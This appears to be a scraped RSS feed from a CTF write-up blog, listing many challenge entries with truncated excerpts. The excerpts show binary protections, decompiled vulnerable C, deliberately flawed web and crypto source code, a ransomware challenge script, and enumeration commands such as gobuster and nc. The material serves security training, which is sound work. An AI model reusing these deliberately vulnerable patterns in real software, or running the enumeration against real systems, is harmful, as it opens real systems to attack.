int main() { undefined8 flag; flag = get_flag(); printf("%s\r|\x1b[4m%*.c\x1b[24m| I\'ve managed to trap the flag ghost in this box, but it\'s turn ed invisible!</description></item><item><title>GhostlyTemplates</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/ghostlytemplates/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/ghostlytemplates/</guid><description>We are given the following website:
We also have the Go source code of the server.
Source code analysis The relevant file is main.go, which is a bit long:
package main import ( "encoding/json" "fmt" "html/template" "io" "net/http" "os" "os/exec" "path/filepath" "strings" ) const WEB_PORT = "1337" const TEMPLATE_DIR = "./templates" type LocationInfo struct { Status string `json:"status"` Country string `json:"country"` CountryCode string `json:"countryCode"` Region string `json:"region"` RegionName string `json:"regionName"` City string `json:"</description></item><item><title>Git Is Good</title><link>https://7rocky.github.io/en/ctf/ctflearn/forensics/git-is-good/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/forensics/git-is-good/</guid><description>We are given a ZIP archive that contains a flag.txt file:
$ ls flag.txt $ cat flag.txt CTFlearn{REDACTED} But this is not the flag. Looking deeply in the folder, we find a .git directory, so we are into a Git repository (also, the chalenge name pointed this):
$ ls -a . .. .git flag.txt We can use git log to show previous commits (which are like snapshots of the project along time):</description></item><item><title>Gloater</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/gloater/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/gloater/</guid><description>We are given a 64-bit binary called gloater:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./glibc/' We are also given a Dockerfile with the container configuration:
FROM ubuntu:20.04 ENV DEBIAN_FRONTEND noninteractive RUN apt-get update --fix-missing &amp;amp;&amp;amp; apt-get -y upgrade RUN apt-get install -y socat RUN useradd -m ctf COPY challenge/* /home/ctf/ RUN chown -R ctf:ctf /home/ctf/ WORKDIR /home/ctf #USER ctf EXPOSE 9001 CMD ["</description></item><item><title>Glory of the Garden</title><link>https://7rocky.github.io/en/ctf/picoctf/forensics/glory-of-the-garden/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/forensics/glory-of-the-garden/</guid><description>We are given a JPEG image called garden.jpg:
The file is recognized as a proper JPEG image:
$ file garden.jpg garden.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 2999x2249, components 3 However, if we show printable strings inside the file contents, we capture the flag (we can specify the length of the string to output):
$ strings -50 garden.jpg Here is a flag "</description></item><item><title>Gobustme 👻</title><link>https://7rocky.github.io/en/ctf/ctflearn/web/gobustme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/web/gobustme/</guid><description>We have this website:
At the bottom it points the use of gobuster and a dictionary of routes called dirb/common.txt:
As the challenge suggests, let&amp;rsquo;s use gobuster with dirb/common.txt:
$ gobuster dir -u https://gobustme.ctflearn.com -w $WORDLISTS/dirb/common.txt -q -r /call (Status: 200) [Size: 42] /carpet (Status: 200) [Size: 69] /flag (Status: 200) [Size: 15] /hide (Status: 200) [Size: 65] /index.html (Status: 200) [Size: 2712] /sex (Status: 200) [Size: 58] /shadow (Status: 200) [Size: 68] /skin (Status: 200) [Size: 120] Nice, let&amp;rsquo;s go to /flag and get the flag:</description></item><item><title>Gonna-Lift-Em-All</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/gonna-lift-em-all/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/gonna-lift-em-all/</guid><description>We got the Python source code used to encrypt the flag:
from Crypto.Util.number import bytes_to_long, getPrime import random FLAG = b'HTB{??????????????????????????????????????????????????????????????????????}' def gen_params(): p = getPrime(1024) g = random.randint(2, p-2) x = random.randint(2, p-2) h = pow(g, x, p) return (p, g, h), x def encrypt(pubkey): p, g, h = pubkey m = bytes_to_long(FLAG) y = random.randint(2, p-2) s = pow(h, y, p) return (g * y % p, m * s % p) def main(): pubkey, privkey = gen_params() c1, c2 = encrypt(pubkey) with open('data.</description></item><item><title>Gonna-Lift-Them-All</title><link>https://7rocky.github.io/en/ctf/other/hackthebooctf/gonna-lift-them-all/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackthebooctf/gonna-lift-them-all/</guid><description>We got the Python source code used to encrypt the flag:
from Crypto.Util.number import bytes_to_long, getPrime import random FLAG = b'HTB{??????????????????????????????????????????????????????????????????????}' def gen_params(): p = getPrime(1024) g = random.randint(2, p-2) x = random.randint(2, p-2) h = pow(g, x, p) return (p, g, h), x def encrypt(pubkey): p, g, h = pubkey m = bytes_to_long(FLAG) y = random.randint(2, p-2) s = pow(h, y, p) return (g * y % p, m * s % p) def main(): pubkey, privkey = gen_params() c1, c2 = encrypt(pubkey) with open('data.</description></item><item><title>Great Old Talisman</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/great-old-talisman/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/great-old-talisman/</guid><description>We are given a 64-bit binary called great_old_talisman:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Reverse engineering If we open the binary in Ghidra, we will see this decompiled C source code for the main function:
void main() { long in_FS_OFFSET; int n; undefined8 canary; canary = *(undefined8 *) (in_FS_OFFSET + 0x28); setup(); banner(); printf("\nThis Great Old Talisman will protect you from the evil powers of zombies!</description></item><item><title>Great Old Talisman</title><link>https://7rocky.github.io/en/ctf/other/htb-unictf/great-old-talisman/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-unictf/great-old-talisman/</guid><description>We are given a 64-bit binary called great_old_talisman:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Reverse engineering If we open the binary in Ghidra, we will see this decompiled C source code for the main function:
void main() { long in_FS_OFFSET; int n; undefined8 canary; canary = *(undefined8 *) (in_FS_OFFSET + 0x28); setup(); banner(); printf("\nThis Great Old Talisman will protect you from the evil powers of zombies!</description></item><item><title>Guessing Game 1</title><link>https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/guessing-game-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/guessing-game-1/</guid><description>We are given a 64-bit static binary called vuln:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Static code analysis We also have the C source code. Basically, what the program does is request a number, compare it with a random one and if it is the same, then request a username to print a message:
#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;sys/types.</description></item><item><title>Guessing Game 2</title><link>https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/guessing-game-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/guessing-game-2/</guid><description>We are given a 32-bit binary called vuln:
Arch: i386-32-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) Static code analysis We also have the C source code. Basically, what the program does is request a number, compare it with a random one and if it is the same, then request a username to print a message:
#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; #include &amp;lt;sys/stat.</description></item><item><title>Guglu v2</title><link>https://7rocky.github.io/en/ctf/other/hackon-ctf/guglu-v2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackon-ctf/guglu-v2/</guid><description>We are provided with a website to create notes. There is also a bot that accesses its profile and then accesses to a URL provided by us. We also have the projects in Node.js.
Source code analysis Registration functions (/register) and login (/login) are correctly implemented.
The main functionality of the application is the possibility of creating and looking for notes (web/src/routes/post.router.js):
router.get('/posts', (req, res) =&amp;gt; { const { page } = req.</description></item><item><title>Gunship</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/gunship/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/gunship/</guid><description>We have a website with a nice style:
There is only one user input:
This is a Node.js application that uses pug as a template renderer (as shown in the available files from the challenge).
It also uses flat to parse JSON data, as shown in the following file called routes/index.js:
const path = require('path') const express = require('express') const pug = require('pug') const { unflatten } = require('flat') const router = express.</description></item><item><title>H1 Thermostat</title><link>https://7rocky.github.io/en/ctf/hacker101ctf/h1-thermostat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/hacker101ctf/h1-thermostat/</guid><description>We have an Android APK file called thermostat.apk:
$ file thermostat.apk thermostat.apk: Zip archive data, at least v0.0 to extract, compression method=deflate As it is shown an APK file is just a ZIP archive. Therefore, we can extract its contents:
$ 7z x thermostat.apk Scanning the drive for archives: 1 file, 2595443 bytes (2535 KiB) Extracting archive: thermostat.apk -- Path = thermostat.apk Type = zip Physical Size = 2595443 Everything is Ok Files: 569 Size: 4968479 Compressed: 2595443 $ ls AndroidManifest.</description></item><item><title>Hackerman</title><link>https://7rocky.github.io/en/ctf/htb-challenges/misc/hackerman/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/misc/hackerman/</guid><description>We are given a JPEG image called hackerman.jpg:
$ file hackerman.jpg hackerman.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 960x540, components 3 Since it is a JPEG image, we can think of steganography using steghide. But it does not seem to work for the moment.
If we check the printable strings that are inside the image file, we will see a string that seems to be an MD5 hash (32 hexadecimal digits):</description></item><item><title>HackyBird</title><link>https://7rocky.github.io/en/ctf/htb-challenges/gamepwn/hackybird/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/gamepwn/hackybird/</guid><description>We have a computer Flappy Bird game:
Objective The objective is to pass the more pipes possible making the bird jump (pressing the space bar). If we fall or hit a pipe, we lose. This game is so silly that it is actually difficult because it needs a lot of precision and concentration. We can pause the game pressing P.
Instead of trying to beat a record, we can start Cheat Engine and modify our points.</description></item><item><title>Halloween Invitation</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/halloween-invitation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/halloween-invitation/</guid><description>We are given a ZIP archive that contains a file named invitation.docm:
$ unzip -l Halloween\ Invitation.zip Archive: Halloween Invitation.zip Length Date Time Name --------- ---------- ----- ---- 5252634 10-12-2022 14:04 invitation.docm --------- ------- 5252634 1 file $ unzip Halloween\ Invitation.zip Archive: Halloween Invitation.zip [Halloween Invitation.zip] invitation.docm password: inflating: invitation.docm $ file invitation.docm invitation.docm: Microsoft Word 2007+ VBA macros extraction This means that we have a Microsoft Word document with VBA macros.</description></item><item><title>Halloween Invitation</title><link>https://7rocky.github.io/en/ctf/other/hackthebooctf/halloween-invitation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackthebooctf/halloween-invitation/</guid><description>We are given a ZIP archive that contains a file named invitation.docm:
$ unzip -l forensics_halloween_invitation.zip Archive: forensics_halloween_invitation.zip Length Date Time Name --------- ---------- ----- ---- 5252634 10-12-2022 08:04 invitation.docm --------- ------- 5252634 1 file $ unzip forensics_halloween_invitation.zip Archive: forensics_halloween_invitation.zip inflating: invitation.docm $ file invitation.docm invitation.docm: Microsoft Word 2007+ VBA macros extraction This means that we have a Microsoft Word document with VBA macros. Instead of opening Microsoft Word, we can use olevba from oletools to extract the VBA code:</description></item><item><title>Hash the Filesystem</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/hash-the-filesystem/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/hash-the-filesystem/</guid><description>We are given a Python source code that asks to sign in and offers some functionalities. This is the main function:
def challenge(req): fnames = initializeDatabase() file_record['admin'] = [fname for fname in fnames] req.sendall(b'Super secret file server for malicious operations.\n' + b'Who are you:\n' + b'&amp;gt; ') user = req.recv(4096).decode().strip() if user == 'admin': req.sendall( b'Administrator can access the server only via ssh.\nGoodbye!\n') return token = json.dumps({'username': user, 'timestamp': str(time.time())}) file_record[user] = [] key = os.</description></item><item><title>HauntMart</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/hauntmart/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/hauntmart/</guid><description>We are given the following website:
We also have the Python source code of the server (Flask).
First of all, we can register a new account and log in:
And we get to this dashboard:
The only functionality is &amp;ldquo;Sell Product&amp;rdquo;:
At this point, let&amp;rsquo;s analyze the source code.
Source code analysis In blueprints/routes.py, we find this endpoint that handles the previous funcionality:
@api.route('/product', methods=['POST']) @isAuthenticated def sellProduct(user): if not request.</description></item><item><title>Headache</title><link>https://7rocky.github.io/en/ctf/htb-challenges/reversing/headache/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/reversing/headache/</guid><description>We have a binary called headache:
$ file headache headache: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, stripped Basic recognition When we run it, it starts writing Initialising and after some seconds, we are asked to enter a key:
$ ./headache Initialising..... Enter the key: asdf Login Failed! Let&amp;rsquo;s debug a bit using GDB. Once we are prompted to enter the key, we can hit ^C and set a breakpoint after the read instruction:</description></item><item><title>Hellhound</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/hellhound/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/hellhound/</guid><description>We have a 64-bit binary called hellound:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./.glibc/' If we execute it, we have the possibility to perform some weird actions:
$ ./hellhound This is what it used to look before the modifications.. _ / \ _-' _/| \-''- _ / __-' { | \ / \ / 'o. |o } | \ ; ', \_ __\ ''-_ \.</description></item><item><title>Hello World!</title><link>https://7rocky.github.io/en/ctf/hacker101ctf/hello-world/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/hacker101ctf/hello-world/</guid><description>We are given a 64-bit binary called vulnerable:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments If we execute the binary, it seems that it does nothing:
$ ./vulnerable asdf fdsa 1 2 If we insert data from standard input (stdin), we make the program work:
$ echo asdf | ./vulnerable Hello asdf ! Let&amp;rsquo;s send 100 characters using Python and check if it crashes:</description></item><item><title>Here's a LIBC</title><link>https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/heres-a-libc/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/heres-a-libc/</guid><description>We are given a 64-bit binary called vuln and a libc.so.6 file as external library:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./' If we run the binary we will get a segmentation fault:
$ chmod +x vuln $ ./vuln zsh: segmentation fault (core dumped) ./vuln It is configured to use Glibc at the current directory:
$ ldd vuln linux-vdso.so.1 (0x00007ffdc3195000) libc.</description></item><item><title>Hextraordinary</title><link>https://7rocky.github.io/en/ctf/ctflearn/cryptography/hextraordinary/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/cryptography/hextraordinary/</guid><description>The challenge introduces us to ROXy, a coder that specializes in short cryptic hard to decipher secret codes.
We are given these hexadecimal values and we know that she has done something with them to generate a secret code:
0xc4115 0x4cf8 Actually, the name ROXy is a hint because she is using XOR cipher. If we operate both numbers using XOR, we get the secret code:
$ python3 -q &amp;gt;&amp;gt;&amp;gt; hex(0xc4115 ^ 0x4cf8) '0xc0ded' So the flag is: CTFlearn{0xc0ded}.</description></item><item><title>Hide and seek</title><link>https://7rocky.github.io/en/ctf/other/ecsc-2023/hide-and-seek/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/ecsc-2023/hide-and-seek/</guid><description>I have hidden my flag among the elliptic curve points. Go seek!
Challenge contributed by CryptoHack
Challenge files:
output.txt hide_and_seek.sage Source code analysis We are given a SageMath script that uses Elliptic Curve Cryptography to encrypt the flag:
from Crypto.Util.number import bytes_to_long FLAG = bytes_to_long(open("flag.txt", "rb").read().strip()[len("ECSC{"):-1]) proof.arithmetic(False) p = 1789850433742566803999659961102071018708588095996784752439608585988988036381340404632423562593 a = 62150203092456938230366891668382702110196631396589305390157506915312399058961554609342345998 b = 1005820216843804918712728918305396768000492821656453232969553225956348680715987662653812284211 F = GF(p) E.&amp;lt;G&amp;gt; = EllipticCurve(F, [a, b]) assert FLAG &amp;lt; G.order() k = randrange(G.</description></item><item><title>Highlighter</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/highlighter/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/highlighter/</guid><description>We are given a binary called highlighter:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) If we use Ghidra, we will see the decompiled source code of the main function:
int main() { int __fd; long in_FS_OFFSET; undefined8 *where; undefined8 what; long canary; canary = *(long *) (in_FS_OFFSET + 0x28); setbuf(stdin, (char *) 0x0); setbuf(stdout, (char *) 0x0); __fd = open("flag.txt", 0); read(__fd, flag, 100); puts("</description></item><item><title>Highlights</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/highlights/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/highlights/</guid><description>We are given a binary called highlights:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) If we use Ghidra, we will see the decompiled source code of the main function:
int main() { undefined8 *address; FILE *fp; setbuf(stdout, (char *) 0x0); setbuf(stdin, (char *) 0x0); fp = fopen("./flag.txt", "r"); __isoc99_fscanf(fp, "%s", flag); printf("What address (in hex) would you like to read?\n&amp;gt;&amp;gt;&amp;gt; "); __isoc99_scanf("</description></item><item><title>Hijack</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/hijack/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/hijack/</guid><description>We are given a remote instance to connect to:
$ nc 167.71.143.44 31614 &amp;lt;------[TCS]------&amp;gt; [1] Create config [2] Load config [3] Exit &amp;gt; Basic recognition We have two options. Using the first one, we can set some configuration and the output is a Base64-encoded string:
$ nc 165.232.100.46 31251 &amp;lt;------[TCS]------&amp;gt; [1] Create config [2] Load config [3] Exit &amp;gt; 1 - Creating new config - Temperature units (F/C/K): C Propulsion Components Target Temperature : 13 Solar Array Target Temperature : 37 Infrared Spectrometers Target Temperature : 0 Auto Calibration (ON/OFF) : ON Serialized config: ISFweXRob24vb2JqZWN0Ol9fbWFpbl9fLkNvbmZpZyB7SVJfc3BlY3Ryb21ldGVyX3RlbXA6ICcwJywgYXV0b19jYWxpYnJhdGlvbjogJ09OJywKICBwcm9wdWxzaW9uX3RlbXA6ICcxMycsIHNvbGFyX2FycmF5X3RlbXA6ICczNycsIHVuaXRzOiBDfQo= Uploading to ship.</description></item><item><title>Hissss</title><link>https://7rocky.github.io/en/ctf/htb-challenges/reversing/hissss/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/reversing/hissss/</guid><description>We have a binary called auth:
$ file auth auth: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3507aa01d32c34dc8e8c6462b764adb90a82768d, stripped Decompilation If we look at the strings of the binary, we will find a lot of references to Python:
$ strings auth | grep python b_asyncio.cpython-38-x86_64-linux-gnu.so b_bisect.cpython-38-x86_64-linux-gnu.so b_blake2.cpython-38-x86_64-linux-gnu.so b_bz2.cpython-38-x86_64-linux-gnu.so b_codecs_cn.cpython-38-x86_64-linux-gnu.so b_codecs_hk.cpython-38-x86_64-linux-gnu.so b_codecs_iso2022.cpython-38-x86_64-linux-gnu.so b_codecs_jp.cpython-38-x86_64-linux-gnu.so b_codecs_kr.cpython-38-x86_64-linux-gnu.so b_codecs_tw.cpython-38-x86_64-linux-gnu.so b_contextvars.cpython-38-x86_64-linux-gnu.so b_csv.cpython-38-x86_64-linux-gnu.so b_ctypes.cpython-38-x86_64-linux-gnu.so b_datetime.cpython-38-x86_64-linux-gnu.so b_decimal.cpython-38-x86_64-linux-gnu.so b_hashlib.cpython-38-x86_64-linux-gnu.so b_heapq.cpython-38-x86_64-linux-gnu.so b_lzma.</description></item><item><title>HM74</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/hm74/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/hm74/</guid><description>We are given this Verilog hardware description code:
module encoder( input [3:0] data_in, output [6:0] ham_out ); wire p0, p1, p2; assign p0 = data_in[3] ^ data_in[2] ^ data_in[0]; assign p1 = data_in[3] ^ data_in[1] ^ data_in[0]; assign p2 = data_in[2] ^ data_in[1] ^ data_in[0]; assign ham_out = { p0, p1, data_in[3], p2, data_in[2], data_in[1], data_in[0] }; endmodule module main; wire[3:0] data_in = 5; wire[6:0] ham_out; encoder en(data_in, ham_out); initial begin #10; $display("</description></item><item><title>Homomurphy's Law</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/homomurphys-law/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/homomurphys-law/</guid><description>We are given the source code of a ransomware project.
Source code analysis This is ransomware.py:
from Crypto import Random from encryption import * import os MBEGIN = "---BEGIN MORPHEUS KEY---" MEND = "---END MORPHEUS KEY---" GBEGIN = "----BEGIN GPUBLIC KEY---" GEND = "---END GPUBLIC KEY---" with open("note.txt", "r") as f: note = f.read() aes = AESP() gm = GM() obf = OBF() def encrypt(key): obf_key = obf.obfuscate(key) enc_key = gm.</description></item><item><title>Hope you know JS</title><link>https://7rocky.github.io/en/ctf/other/blackhat-ctf/hope-you-know-js/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/blackhat-ctf/hope-you-know-js/</guid><description>We are given an obfuscated JavaScript file called good-luck.js. When running it on a simple HTML document it will show a prompt to validate the flag:
&amp;lt;!doctype html&amp;gt; &amp;lt;html lang="en"&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset="UTF-8"&amp;gt; &amp;lt;title&amp;gt;Hope you know JS&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;script src="good-luck.js"&amp;gt;&amp;lt;/script&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; Making use of Visual Studio Code Prettier formatter, I was able to find some patterns that where repeated along the code. For example, I started substituting expressions like +!</description></item><item><title>Horror Feeds</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/horror-feeds/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/horror-feeds/</guid><description>We are given this website:
Static code analysis We are also given the Python source code of the web application, built in Flask. Since we are dealing with a login form, let&amp;rsquo;s take a look at the database interaction (application/database.py):
from colorama import Cursor from application.util import generate_password_hash, verify_hash, generate_token from flask_mysqldb import MySQL mysql = MySQL() def query_db(query, args=(), one=False): with open('/tmp/log', 'a') as f: f.write(query + '\n') cursor = mysql.</description></item><item><title>Horror Feeds</title><link>https://7rocky.github.io/en/ctf/other/hackthebooctf/horror-feeds/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackthebooctf/horror-feeds/</guid><description>We are given this website:
Static code analysis We are also given the Python source code of the web application, built in Flask. Since we are dealing with a login form, let&amp;rsquo;s take a look at the database interaction (application/database.py):
from colorama import Cursor from application.util import generate_password_hash, verify_hash, generate_token from flask_mysqldb import MySQL mysql = MySQL() def query_db(query, args=(), one=False): with open('/tmp/log', 'a') as f: f.write(query + '\n') cursor = mysql.</description></item><item><title>How The Columns Have Turned</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/how-the-columns-have-turned/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/how-the-columns-have-turned/</guid><description>We are given a Python code to encrypt the flag (source.py), and we are also given dialog.txt and encrypted_messages.txt:
import os with open('super_secret_messages.txt', 'r') as f: SUPER_SECRET_MESSAGES = [msg.strip() for msg in f.readlines()] def deriveKey(key): derived_key = [] for i, char in enumerate(key): previous_letters = key[:i] new_number = 1 for j, previous_char in enumerate(previous_letters): if previous_char &amp;gt; char: derived_key[j] += 1 else: new_number += 1 derived_key.append(new_number) return derived_key def transpose(array): return [row for row in map(list, zip(*array))] def flatten(array): return "</description></item><item><title>HTB Console</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/htb-console/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/htb-console/</guid><description>We are given a 64-bit binary called htb-console:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Reverse engineering If we use Ghidra, we will see the following main function:
void main() { char command[16]; setup(); puts("Welcome HTB Console Version 0.1 Beta."); do { printf("&amp;gt;&amp;gt; "); fgets(command, 16, stdin); console(command); memset(command, 0, 16); } while(true); } The above code only asks for user input and passes the string to console:</description></item><item><title>HTBank</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/htbank/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/htbank/</guid><description>We are given this website:
This time we don&amp;rsquo;t have source code available, so we must poke around with the website.
Registering a new account First of all, we can register a new account:
And then we can log in to access our dashboard:
Analyzing JavaScript files We can withdraw money clicking the button:
But we can&amp;rsquo;t add money because the other button is not working.
Looking at the JavaScript files (/static/js/home.</description></item><item><title>Hunting License</title><link>https://7rocky.github.io/en/ctf/htb-challenges/reversing/hunting-license/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/reversing/hunting-license/</guid><description>We have a binary called license:
$ file license license: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5be88c3ed329c1570ab807b55c1875d429a581a7, for GNU/Linux 3.2.0, not stripped $ ldd license linux-vdso.so.1 (0x00007ffe18bb1000) libreadline.so.8 => /lib/x86_64-linux-gnu/libreadline.so.8 (0x00007f430a30a000) libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f430a118000) libtinfo.so.6 => /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007f430a0e8000) /lib64/ld-linux-x86-64.so.2 (0x00007f430a366000) Decompilation If we open it in Ghidra, we will see this main function:
int main() { char cVar1; int iVar2; puts("So, you want to be a relic hunter?</description></item><item><title>HyperStream Test #2</title><link>https://7rocky.github.io/en/ctf/ctflearn/cryptography/hyperstream-test-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/cryptography/hyperstream-test-2/</guid><description>We are given this string with only A and B letters:
ABAAAABABAABBABBAABBAABAAAAAABAAAAAAAABAABBABABBAAAAABBABBABABBAABAABABABBAABBABBAABB The challenge says that it smells like bacon. In fact, there is Bacon Cipher and we can use it to decrypt the string in CyberChef:
So the flag is: CTFlearn{ILOUEBACONDONTYOU}.</description></item><item><title>I know Mag1k</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/i-know-mag1k/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/i-know-mag1k/</guid><description>We are given the following website:
First of all, we must register a new account:
Now we can log in:
And we have access to our dashboard:
We can see that there are two cookies set by the server to handle authentication:
